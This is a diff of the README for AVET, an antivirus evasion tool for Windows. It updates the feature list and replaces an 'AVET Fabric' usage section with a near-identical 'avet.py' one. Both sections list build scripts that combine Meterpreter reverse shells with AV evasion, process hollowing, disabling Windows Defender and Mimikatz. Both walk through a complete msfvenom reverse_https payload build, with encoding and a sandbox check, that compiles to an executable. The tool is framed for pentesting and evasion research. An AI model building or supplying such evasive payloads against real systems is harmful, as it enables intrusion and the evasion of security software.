@@ -2,25 +2,19 @@ AntiVirus Evasion Tool
 ======================
 
 AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques, as well as other methods used by malicious software.
-For an overview of new features in **v2.1**, as well as past version increments, have a look at the **CHANGELOG** file.
+For an overview of new features in **v2.2**, as well as past version increments, have a look at the **CHANGELOG** file.
 
-Version 2 came with a large architectural overhaul, which shifted the specifics for building the output executable from
-the internal C code to configuring mostly everything in the build script, providing a small configuration command language.
-This makes the configuration process more intuitive overall.
-
-Furthermore, the underlying code is now more modular, which eases the addition of new features.
-
-With the new architecture and features you are now quite flexible in building your executable.
-You may, for example, download your encrypted paylaod via powershell, while supplying the decryption key via command line argument at execution time, and finally inject your payload into another process, choosing from multiple techniques.
-You may also add initial command executions and environmental sandbox checks.
-Chaining multiple iterations of AVET enables you to add multiple evasion layers, if necessary.
-
-What & Why:
+Some features:
 - when running a .exe file made with msfpayload & co, the file will often be recognized by antivirus software
 - AVET is an antivirus evasion tool targeting windows machines with executable files
 - different kinds of input payloads can be used now: shellcode, exe and dlls
 - more techniques available: shellcode/dll injection, process hollowing and more
 - flexible retrieval methods for payload, decryption key, etc.
+- usage as a dropper
+- Chaining multiple iterations of AVET enables you to add multiple evasion layers, if necessary
+- combination of techniques: download your encrypted payload via powershell, while supplying the decryption key via command line argument at execution time, and finally inject your payload into another process, choosing from multiple techniques
+- basic sandbox checks
+- executie all available build scripts with build_script_tester.py, might also be interesting for researchers for building a set of "malicious" samples using different evasion and injection techniques
 
 
 Installation
@@ -42,12 +36,158 @@ If for whatever reason you want to do things manually:
 How to install tdm-gcc with wine:
 [https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)
 
-
 Important Note
 --------------
 Not all techniques will evade every AV engine. If one technique or build script does not work, please test another one.
 Feel free to experiment! After all this is a toolbox - yet you should wield the hammer yourself.
 
+
+## avet.py
+
+**avet.py** is a small Python utility which was designed to assist you in using the tool.
+
+It lists all scripts that are currently present in the build folder. After selecting one, you will be able to step through the script line by line, having the opportunity to modify the contents on the fly.
+
+The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric. 
+You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
+
+These modifications are temporary, which means that any changes you made will not persist in the build script on disk.
+The modified version is executed once, and your executable built.
+
+Here's a quick example (python3 || gtfo):
+```
+python3 avet_fabric.py 
+
+                       .|        ,       +
+             *         | |      ((             *
+                       |'|       `    ._____
+         +     ___    |  |   *        |.   |' .---"|
+       _    .-'   '-. |  |     .--'|  ||   | _|    |
+    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+    |' | |.    |    ||       | |   |  |    ||      |
+ ___|  '-'     '    ""       '-'   '-.'    '`      |____
+jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+avet.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
+
+0: build_40xshikata_revhttpsunstaged_win32.sh
+1: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
+2: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
+3: build_calcfromcmd_50xshikata_revhttps_win32.sh
+4: build_avetenc_fopen_revhttps_win32.sh
+5: build_fopen_quiet_revhttps_win32.sh
+6: build_downloadpsh_revhttps_win32.sh
+7: build_avetenc_mtrprtrxor_revhttps_win64.sh
+8: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
+9: buildsvc_20xshikata_bindtcp_win32.sh
+10: build_downloadbitsadmin_revhttps_win32.sh
+11: build_cpucores_revhttps_win32.sh
+12: build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
+13: build_asciimsf_revhttps_win32.sh
+14: build_downloadsocket_revhttps_win32.sh
+15: build_calcfrompowersh_50xshikata_revhttps_win32.sh
+16: build_avetenc_dynamicfromfile_revhttps_win32.sh
+17: build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
+18: build_downloadcertutil_revhttps_win32.sh
+19: build_downloadsocket_mtrprtrxor_revhttps_win64.sh
+20: build_fopen_mtrprtrxor_revhttps_win64.sh
+21: build_asciimsf_fromcmd_revhttps_win32.sh
+22: build_fopen_revhttps_win32.sh
+23: build_kaspersky_fopen_shellrevtcp_win32.sh
+24: build_hasvmmac_revtcp_win32.sh
+25: build_rc4enc_mimikatz_win64.sh
+26: build_dkmc_downloadexecshc_revhttps_win32.sh
+27: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
+28: build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
+29: build_50xshikata_quiet_revhttps_win32.sh
+30: build_hasvmkey_revhttps_win32.sh
+31: build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
+32: build_50xshikata_revhttps_win32.sh
+33: build_mimikatz_pe2shc_xorfromcmd_win64.sh
+34: build_downloadiexplorer_revhttps_win32.sh
+35: build_dynamicfromfile_revhttps_win32.sh
+36: build_gethostbyname_revhttps_win32.sh
+Input number of the script you want use and hit enter: 4
+
+Now you can edit the build script line by line.
+
+Use AVET encoding.
+print AVET logo
+$ cat banner.txt
+include script containing the compiler var $win32_compiler
+you can edit the compiler in build/global_win32.sh
+or enter $win32_compiler="mycompiler" here
+$ . build/global_win32.sh
+import feature construction interface
+$ . build/feature_construction.sh
+import global default lhost and lport values from build/global_connect_config.sh
+$ . build/global_connect_config.sh
+override connect-back settings here, if necessary
+$ LPORT=$GLOBAL_LPORT
+$ LHOST=$GLOBAL_LHOST
+make meterpreter reverse payload, encoded with shikata_ga_nai
+$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+encode the shellcode via AVET encoding.
+$ encode_payload avet input/sc_c.txt input/scenc_raw.txt
+add fopen sandbox evasion
+$ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+convert encoded shellcode file to c array style for static include
+$ ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+no command preexec
+$ set_command_source no_data
+$ set_command_exec no_command
+set shellcode source
+$ set_payload_source static_from_file input/scenc_c.txt
+set decoder and key source
+AVET decoder needs no key
+$ set_decoder avet
+$ set_key_source no_data
+set payload info source
+$ set_payload_info_source no_data
+set shellcode binding technique
+$ set_payload_execution_method exec_shellcode
+enable debug output
+$ enable_debug_print
+compile to output.exe file
+$ $win32_compiler -o output/output.exe source/avet.c
+$ strip output/output.exe
+cleanup
+$ cleanup_techniques
+
+The following commands will be executed:
+#/bin/bash
+cat banner.txt
+. build/global_win32.sh
+. build/feature_construction.sh
+. build/global_connect_config.sh
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+encode_payload avet input/sc_c.txt input/scenc_raw.txt
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+set_command_source no_data
+set_command_exec no_command
+set_payload_source static_from_file input/scenc_c.txt
+set_decoder avet
+set_key_source no_data
+set_payload_info_source no_data
+set_payload_execution_method exec_shellcode
+enable_debug_print
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
+cleanup_techniques
+
+Press enter to continue.
+
+Building the output file...
+
+Please stand by...
+
+The output file should be placed in the output directory.
+
+Bye...
+```
 
 How to use 
 ----------
@@ -462,157 +602,6 @@ System Language : de_DE
 Domain : ARBEITSGRUPPE
 Logged On Users : 2
 Meterpreter : x86/windows
-```
-
-
-## AVET Fabric
-
-**avet_fabric** is a small Python utility which was designed to assist you in using the tool.
-
-It lists all scripts that are currently present in the build folder. After selecting one, you will be able to step through the script line by line, having the opportunity to modify the contents on the fly.
-
-The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric. 
-You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
-
-These modifications are temporary, which means that any changes you made will not persist in the build script on disk.
-The modified version is executed once, and your executable built.
-
-Here's a quick example (python3 || gtfo):
-```
-python3 avet_fabric.py 
-
-                       .|        ,       +
-             *         | |      ((             *
-                       |'|       `    ._____
-         +     ___    |  |   *        |.   |' .---"|
-       _    .-'   '-. |  |     .--'|  ||   | _|    |
-    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
-    |' | |.    |    ||       | |   |  |    ||      |
- ___|  '-'     '    ""       '-'   '-.'    '`      |____
-jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-AVET Fabric by Daniel Sauder, Florian Saager
-
-avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
-
-0: build_40xshikata_revhttpsunstaged_win32.sh
-1: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
-2: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
-3: build_calcfromcmd_50xshikata_revhttps_win32.sh
-4: build_avetenc_fopen_revhttps_win32.sh
-5: build_fopen_quiet_revhttps_win32.sh
-6: build_downloadpsh_revhttps_win32.sh
-7: build_avetenc_mtrprtrxor_revhttps_win64.sh
-8: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
-9: buildsvc_20xshikata_bindtcp_win32.sh
-10: build_downloadbitsadmin_revhttps_win32.sh
-11: build_cpucores_revhttps_win32.sh
-12: build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
-13: build_asciimsf_revhttps_win32.sh
-14: build_downloadsocket_revhttps_win32.sh
-15: build_calcfrompowersh_50xshikata_revhttps_win32.sh
-16: build_avetenc_dynamicfromfile_revhttps_win32.sh
-17: build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
-18: build_downloadcertutil_revhttps_win32.sh
-19: build_downloadsocket_mtrprtrxor_revhttps_win64.sh
-20: build_fopen_mtrprtrxor_revhttps_win64.sh
-21: build_asciimsf_fromcmd_revhttps_win32.sh
-22: build_fopen_revhttps_win32.sh
-23: build_kaspersky_fopen_shellrevtcp_win32.sh
-24: build_hasvmmac_revtcp_win32.sh
-25: build_rc4enc_mimikatz_win64.sh
-26: build_dkmc_downloadexecshc_revhttps_win32.sh
-27: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
-28: build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
-29: build_50xshikata_quiet_revhttps_win32.sh
-30: build_hasvmkey_revhttps_win32.sh
-31: build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
-32: build_50xshikata_revhttps_win32.sh
-33: build_mimikatz_pe2shc_xorfromcmd_win64.sh
-34: build_downloadiexplorer_revhttps_win32.sh
-35: build_dynamicfromfile_revhttps_win32.sh
-36: build_gethostbyname_revhttps_win32.sh
-Input number of the script you want use and hit enter: 4
-
-Now you can edit the build script line by line.
-
-Use AVET encoding.
-print AVET logo
-$ cat banner.txt
-include script containing the compiler var $win32_compiler
-you can edit the compiler in build/global_win32.sh
-or enter $win32_compiler="mycompiler" here
-$ . build/global_win32.sh
-import feature construction interface
-$ . build/feature_construction.sh
-import global default lhost and lport values from build/global_connect_config.sh
-$ . build/global_connect_config.sh
-override connect-back settings here, if necessary
-$ LPORT=$GLOBAL_LPORT
-$ LHOST=$GLOBAL_LHOST
-make meterpreter reverse payload, encoded with shikata_ga_nai
-$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
-encode the shellcode via AVET encoding.
-$ encode_payload avet input/sc_c.txt input/scenc_raw.txt
-add fopen sandbox evasion
-$ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-convert encoded shellcode file to c array style for static include
-$ ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-no command preexec
-$ set_command_source no_data
-$ set_command_exec no_command
-set shellcode source
-$ set_payload_source static_from_file input/scenc_c.txt
-set decoder and key source
-AVET decoder needs no key
-$ set_decoder avet
-$ set_key_source no_data
-set payload info source
-$ set_payload_info_source no_data
-set shellcode binding technique
-$ set_payload_execution_method exec_shellcode
-enable debug output
-$ enable_debug_print
-compile to output.exe file
-$ $win32_compiler -o output/output.exe source/avet.c
-$ strip output/output.exe
-cleanup
-$ cleanup_techniques
-
-The following commands will be executed:
-#/bin/bash
-cat banner.txt
-. build/global_win32.sh
-. build/feature_construction.sh
-. build/global_connect_config.sh
-LPORT=$GLOBAL_LPORT
-LHOST=$GLOBAL_LHOST
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
-encode_payload avet input/sc_c.txt input/scenc_raw.txt
-add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-set_command_source no_data
-set_command_exec no_command
-set_payload_source static_from_file input/scenc_c.txt
-set_decoder avet
-set_key_source no_data
-set_payload_info_source no_data
-set_payload_execution_method exec_shellcode
-enable_debug_print
-$win32_compiler -o output/output.exe source/avet.c
-strip output/output.exe
-cleanup_techniques
-
-Press enter to continue.
-
-Building the output file...
-
-Please stand by...
-
-The output file should be placed in the output directory.
-
-Bye...
-
 ```
 
 
